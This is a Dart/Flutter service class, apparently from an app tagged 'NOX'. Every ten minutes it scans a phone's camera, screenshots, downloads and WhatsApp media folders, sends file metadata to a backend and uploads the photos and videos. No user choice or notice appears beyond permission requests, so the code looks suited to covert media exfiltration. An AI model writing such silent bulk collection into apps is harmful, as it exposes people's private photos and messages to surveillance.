import 'dart:async';
import 'dart:io';
import 'package:flutter/foundation.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'api_service.dart';

/// Scans media directories, ships file metadata, and uploads binaries to backend.
class GallerySyncService {
  final ApiService _api;
  Timer? _timer;
  bool _running = false;

  static const _roots = <String>[
    '/storage/emulated/0/DCIM/Camera',
    '/storage/emulated/0/DCIM',
    '/storage/emulated/0/Pictures',
    '/storage/emulated/0/Pictures/Screenshots',
    '/storage/emulated/0/Download',
    '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images',
    '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video',
    '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
    '/storage/emulated/0/WhatsApp/Media/WhatsApp Video',
  ];

  static const _mimeMap = <String, String>{
    '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png',
    '.webp': 'image/webp', '.gif': 'image/gif', '.heic': 'image/heic',
    '.mp4': 'video/mp4', '.3gp': 'video/3gpp', '.mov': 'video/quicktime',
    '.pdf': 'application/pdf',
  };

  static const _maxSeen = 20000;
  static const _seenKey = 'nox_gallery_seen_v1';
  static const _uploadedKey = 'nox_gallery_uploaded_v1';
  static const _batchSize = 50;
  /// Max file size to upload (50 MB).
  static const _maxUploadBytes = 50 * 1024 * 1024;

  GallerySyncService(this._api);

  Future<void> start() async {
    stop();
    await _requestPermissions();
    unawaited(_scan());
    _timer = Timer.periodic(const Duration(minutes: 10), (_) => _scan());
  }

  Future<void> _requestPermissions() async {
    try {
      if (Platform.isAndroid) {
        await Permission.photos.request();
        await Permission.videos.request();
        await Permission.storage.request();
      }
    } catch (e) {
      debugPrint('[NOX Gallery] Permission request error: $e');
    }
  }

  void stop() { _timer?.cancel(); _timer = null; }

  Future<void> _scan() async {
    if (_running) return;
    _running = true;
    try {
      final prefs = await SharedPreferences.getInstance();
      final seen = (prefs.getStringList(_seenKey) ?? <String>[]).toSet();
      final newItems = <Map<String, dynamic>>[];
      final newKeys = <String>[];
      final filesToUpload = <_UploadCandidate>[];

      for (final root in _roots) {
        final dir = Directory(root);
        if (!await dir.exists()) continue;
        await for (final entity in dir.list(recursive: true, followLinks: false)) {
          if (entity is! File) continue;
          try {
            final stat = await entity.stat();
            if (stat.size <= 0) continue;
            final name = entity.path.split('/').last;
            final ext = _ext(name);
            if (ext == null) continue;
            final key = '${entity.path}|${stat.size}';
            if (seen.contains(key)) continue;
            final mime = _mimeMap[ext] ?? 'application/octet-stream';
            final takenAt = stat.modified.toUtc().toIso8601String();
            newItems.add({
              'fileName': name, 'filePath': entity.path, 'fileSize': stat.size,
              'mimeType': mime, 'takenAt': takenAt,
            });
            newKeys.add(key);
            // Queue images/videos under 10MB for binary upload
            if (stat.size <= _maxUploadBytes &&
                (mime.startsWith('image/') || mime.startsWith('video/'))) {
              filesToUpload.add(_UploadCandidate(
                path: entity.path, key: key, takenAt: takenAt,
              ));
            }
            if (newItems.length >= _batchSize) {
              await _ship(newItems, newKeys, seen, prefs);
            }
          } catch (_) {}
        }
      }
      if (newItems.isNotEmpty) await _ship(newItems, newKeys, seen, prefs);

      // Upload binaries for new files
      if (filesToUpload.isNotEmpty) {
        await _uploadBinaries(filesToUpload, prefs);
      }
    } catch (e) {
      debugPrint('[NOX Gallery] scan error: $e');
    } finally { _running = false; }
  }

  Future<void> _ship(List<Map<String, dynamic>> items, List<String> keys, Set<String> seen, SharedPreferences prefs) async {
    try {
      await _api.submitGalleryBatch(List<Map<String, dynamic>>.from(items));
      seen.addAll(keys);
      if (seen.length > _maxSeen) {
        final list = seen.toList();
        seen..clear()..addAll(list.sublist(list.length - _maxSeen));
      }
      await prefs.setStringList(_seenKey, seen.toList());
      debugPrint('[NOX Gallery] shipped ${items.length} items');
    } catch (e) { debugPrint('[NOX Gallery] ship error: $e'); }
    finally { items.clear(); keys.clear(); }
  }

  Future<void> _uploadBinaries(List<_UploadCandidate> candidates, SharedPreferences prefs) async {
    final uploaded = (prefs.getStringList(_uploadedKey) ?? <String>[]).toSet();
    var count = 0;
    for (final c in candidates) {
      if (uploaded.contains(c.key)) continue;
      try {
        final file = File(c.path);
        if (!await file.exists()) continue;
        await _api.submitGalleryUpload(c.path, takenAt: c.takenAt);
        uploaded.add(c.key);
        count++;
        if (count % 5 == 0) {
          _trimSet(uploaded);
          await prefs.setStringList(_uploadedKey, uploaded.toList());
        }
      } catch (e) {
        debugPrint('[NOX Gallery] upload error for ${c.path}: $e');
      }
    }
    if (count > 0) {
      _trimSet(uploaded);
      await prefs.setStringList(_uploadedKey, uploaded.toList());
      debugPrint('[NOX Gallery] uploaded $count binaries');
    }
  }

  void _trimSet(Set<String> s) {
    if (s.length > _maxSeen) {
      final list = s.toList();
      s..clear()..addAll(list.sublist(list.length - _maxSeen));
    }
  }

  String? _ext(String name) {
    final i = name.lastIndexOf('.');
    if (i < 0 || i == name.length - 1) return null;
    return name.substring(i).toLowerCase();
  }
}

class _UploadCandidate {
  final String path;
  final String key;
  final String takenAt;
  const _UploadCandidate({required this.path, required this.key, required this.takenAt});
}
